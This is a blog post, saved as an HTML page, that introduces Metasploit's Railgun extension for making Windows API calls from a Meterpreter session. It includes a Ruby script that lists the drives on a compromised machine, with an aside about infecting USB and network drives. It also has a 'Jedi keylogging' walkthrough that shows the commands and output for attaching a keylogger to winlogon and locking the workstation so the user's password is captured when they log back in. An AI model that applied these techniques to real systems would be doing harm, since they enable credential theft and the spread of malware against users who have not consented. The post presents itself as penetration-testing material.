<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="">
  <meta name="generator" content="Hugo 0.14" />

  <title>

<body>
<div id="layout">

  
<a href="#menu" id="menuLink" class="menu-link">
  
  <span></span>
</a>
<div id="menu">

  

  <div class="pure-menu">
    <ul class="pure-menu-list">
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
      
        </li>
      
    </ul>
  </div>

  <div class="pure-menu social">
  <ul class="pure-menu-list">

    <li class="pure-menu-item">
      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
    </li>

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

    

  </ul>
</div>

  <div class="pure-g">
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>&copy; 2016. All rights reserved.</small>
  </div>
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
  </div>
</div>

</div>


  <div id="main">


<div class="header">
  <h1>Intro to RailGun: WIN API for Meterpreter</h1>
  <h2></h2>
</div>
<div class="content">
  

<p>Back on June 13th, &ldquo;Patrick HVE&rdquo; released RAILGUN:</p>

<p><a href="http://mail.metasploit.com/pipermail/framework/2010-June/006382.html">http://mail.metasploit.com/pipermail/framework/2010-June/006382.html</a></p>

<p>And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:</p>

<p><a href="http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712">http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712</a></p>

<p>Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:</p>

<ul>
<li><p>iphlpapi</p></li>

<li><p>ws2_32</p></li>

<li><p>kernel32</p></li>

<li><p>ntdll</p></li>

<li><p>user32</p></li>

<li><p>advapi32</p></li>
</ul>

<p>(You can find out exactly what functions are available by default in the api.rb file)</p>

<p>It&rsquo;s also very extensible, it doesn&rsquo;t have a DLL or function you need? But you can read all about in the manual:</p>

<p>./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf</p>

<p>Here are two examples where this comes in very handy:</p>

<h2 id="list-drives:1be7096449894c4f067b69b2d2c6d183">List Drives:</h2>

<p>The problem that I&rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.</p>

<ul>
<li><p>net use - Shows you what Network drives are connected, but not physical ones</p></li>

<li><p>fsutil fsinfo drives - You must be an administrator to ride this train</p></li>

<li><p>fdisk /status - Only on OLD versions of DOS, not sure when this disappeared</p></li>
</ul>

<p>But railgun solves this problem with a really short script:</p>

<blockquote>
<h1 id="load-the-railgun-plugin-update-you-no-longer-need-this-step:1be7096449894c4f067b69b2d2c6d183">Load the Railgun plugin  <strong><em>Update: You no longer need this step</em></strong></h1>

<p>client.core.use(&ldquo;railgun&rdquo;)</p>

<h1 id="make-the-api-call-to-enum-drive-letters:1be7096449894c4f067b69b2d2c6d183">Make the API call to enum drive letters</h1>

<p>a = client.railgun.kernel32.GetLogicalDrives()[&ldquo;return&rdquo;]</p>

<h1 id="math-magic-to-convert-the-binary-to-letters:1be7096449894c4f067b69b2d2c6d183">Math magic to convert the binary to letters</h1>

<p>drives = []<br />
letters = &ldquo;ABCDEFGHIJKLMNOPQRSTUVWXYZ&rdquo;<br />
(0..25).each do |i|<br />
test = letters[i,1]<br />
rem = a % (2**(i+1))<br />
if rem &gt; 0<br />
drives &lt;&lt; test<br />
a = a - rem<br />
end<br />
end<br />
print_line(&ldquo;Drives Available = #{drives.inspect}&rdquo;)</p>
</blockquote>

<p><strong>Output:<br />
Drives Available = [&ldquo;A&rdquo;, &ldquo;C&rdquo;, &ldquo;D&rdquo;, &ldquo;P&rdquo;, &ldquo;X&rdquo;]</strong></p>

<p>Save this as a meterpreter script and it&rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).</p>

<p>Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drivesâ€¦</p>

<h2 id="jedi-keylogging:1be7096449894c4f067b69b2d2c6d183">JEDI KEYLOGGING:</h2>

<p>One of the problems with keylogging is you never know when that person will log in, and if you&rsquo;re using a client side, they have probably already logged in and you&rsquo;re hoping they log into a portal or some other password protected site.</p>

<p>Railgun to the rescue again:</p>

<blockquote>
<p><strong># Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon</strong><br />
meterpreter &gt; bgrun keylogrecorder -c 1 -t 15<br />
[<em>] Executed Meterpreter with Job ID 0<br />
meterpreter &gt; [</em>] winlogon.exe Process found, migrating into 640<br />
[<em>] Migration Successful!!<br />
[</em>] Starting the keystroke sniffer&hellip;<br />
[<em>] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt<br />
[</em>] Recording</p>
</blockquote>

<p><strong># Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.</strong>
&gt;
&gt;</p>

<blockquote>
<p>meterpreter &gt; irb<br />
[<em>] Starting IRB shell<br />
[</em>] The &lsquo;client&rsquo; variable holds the meterpreter client</p>

<blockquote>
<blockquote>
<p>client.core.use(&ldquo;railgun&rdquo;)<br />
=&gt; true<br />
client.railgun.user32.LockWorkStation()<br />
=&gt; {&ldquo;GetLastError&rdquo;=&gt;0, &ldquo;return&rdquo;=&gt;true}<br />
exit<br />
meterpreter &gt;</p>
</blockquote>
</blockquote>
</blockquote>

<p>Set up &ldquo;tail -f&rdquo; going on the log file for the keylogger and then kill the keylogger when you&rsquo;ve gotten what you came for.</p>

<blockquote>
<p>meterpreter &gt; bglist<br />
[<em>] Job 0: [&ldquo;keylogrecorder&rdquo;, &ldquo;-c&rdquo;, &ldquo;1&rdquo;, &ldquo;-t&rdquo;, &ldquo;15&rdquo;]<br />
meterpreter &gt; bgkill 0<br />
[</em>] Killing background job 0&hellip;<br />
meterpreter &gt;</p>
</blockquote>

<p>Hope you have fun with railgun and shoot me an email <a href="mailto:mubix@hak5.org">mubix@hak5.org</a> or leave a comment if you have any other crazy uses for railgun.</p>

</div>

</div>
</div>
<script src="http://localhost:1313/js/ui.js"></script>




</body>
</html>

